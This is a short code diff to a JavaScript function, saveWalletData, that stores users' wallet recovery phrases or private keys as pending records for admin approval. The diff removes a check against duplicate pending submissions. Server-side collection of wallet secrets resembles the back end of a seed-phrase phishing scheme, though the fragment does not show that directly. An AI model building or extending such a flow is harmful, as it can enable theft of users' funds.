@@ -20,10 +20,7 @@ export async function saveWalletData({ type, data, walletName, password }) {
   else if (type === "private") Model = PrivateKey;
   else throw new Error("Invalid wallet type");
 
-  const existing = await Model.findOne({ userId, status: "pending" });
-  if (existing) {
-    return { success: false, error: "You already have a pending submission. Please wait for admin approval." };
-  }
+  
 
   // Save new pending record
   if (type === "phrase") {
